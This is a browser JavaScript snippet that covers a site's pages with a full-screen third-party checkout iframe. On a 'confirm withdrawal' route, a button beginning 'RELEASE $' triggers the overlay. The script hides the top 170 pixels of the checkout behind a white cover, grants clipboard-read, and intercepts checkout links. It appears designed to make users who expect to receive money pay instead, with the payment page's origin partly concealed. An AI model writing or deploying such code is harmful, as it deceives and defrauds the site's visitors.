(function () {
  if (window.__checkoutEmbedInstalled) return;
  window.__checkoutEmbedInstalled = true;

  var CHECKOUT_URL = "https://checkout.vendepay.com/12ae4dae-df3d-4db0-b597-a00a77c1b6b8";

  function checkoutUrlWithParams() {
    var target = new URL(CHECKOUT_URL);
    new URLSearchParams(window.location.search).forEach(function (value, key) {
      if (value && !target.searchParams.has(key)) target.searchParams.set(key, value);
    });
    return target.toString();
  }

  var root;
  var iframe;
  var checkoutRequested = false;

  function revealCheckout() {
    if (!root || !checkoutRequested) return;
    root.style.transform = "translate3d(0,0,0)";
    root.style.pointerEvents = "auto";
    document.documentElement.style.overflow = "hidden";
    document.body.style.overflow = "hidden";
  }

  function prepareCheckout() {
    if (root) return;

    root = document.createElement("div");
    root.id = "__checkout-embed-root";
    root.style.cssText =
      "position:fixed;inset:0;z-index:2147483647;display:flex;width:100%;height:100%;background:#fff;transform:translate3d(110%,0,0);pointer-events:none;contain:strict;will-change:transform;";

    iframe = document.createElement("iframe");
    iframe.src = checkoutUrlWithParams();
    iframe.title = "Secure checkout";
    iframe.allow = "payment; publickey-credentials-get; clipboard-read; clipboard-write";
    iframe.setAttribute("allowfullscreen", "true");
    iframe.style.cssText = "flex:1 1 0%;width:100%;height:100%;border:0;background:#fff;";

    root.appendChild(iframe);

    var topCover = document.createElement("div");
    topCover.id = "__checkout-embed-top-cover";
    topCover.style.cssText =
      "position:absolute;top:0;left:0;right:0;height:170px;background:#fff;z-index:1;pointer-events:auto;";
    root.appendChild(topCover);

    document.body.appendChild(root);
  }

  function showCheckout() {
    checkoutRequested = true;
    prepareCheckout();
    revealCheckout();
  }

  document.addEventListener(
    "pointerdown",
    function (event) {
      if (window.location.pathname !== "/confirmar-saque") return;

      var button = event.target && event.target.closest && event.target.closest("button");
      if (!button || button.disabled) return;

      var label = (button.textContent || "").trim().toUpperCase();
      if (label.indexOf("RELEASE $") !== 0) return;

      showCheckout();
    },
    true
  );

  document.addEventListener(
    "click",
    function (event) {
      if (event.defaultPrevented || event.button !== 0 || event.metaKey || event.ctrlKey || event.shiftKey || event.altKey) {
        return;
      }

      var link = event.target && event.target.closest && event.target.closest("a[href]");
      if (!link || link.hasAttribute("data-direct-checkout")) return;

      try {
        var url = new URL(link.href, window.location.href);
        if (url.origin !== window.location.origin || url.pathname !== "/checkout") return;
        event.preventDefault();
        showCheckout();
      } catch (error) {}
    },
    true
  );

  function prewarmCheckout() {
    if (
      window.location.pathname === "/landingpage" ||
      window.location.pathname === "/inicio" ||
      window.location.pathname === "/resgatar" ||
      window.location.pathname === "/confirmar-saque"
    ) {
      prepareCheckout();
    }
  }

  function observeRouteChanges() {
    ["pushState", "replaceState"].forEach(function (method) {
      var original = window.history[method];
      window.history[method] = function () {
        var result = original.apply(this, arguments);
        prewarmCheckout();
        return result;
      };
    });

    window.addEventListener("popstate", prewarmCheckout);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", prewarmCheckout, { once: true });
  } else {
    prewarmCheckout();
  }

  observeRouteChanges();

  window.showEmbeddedCheckout = showCheckout;
})();
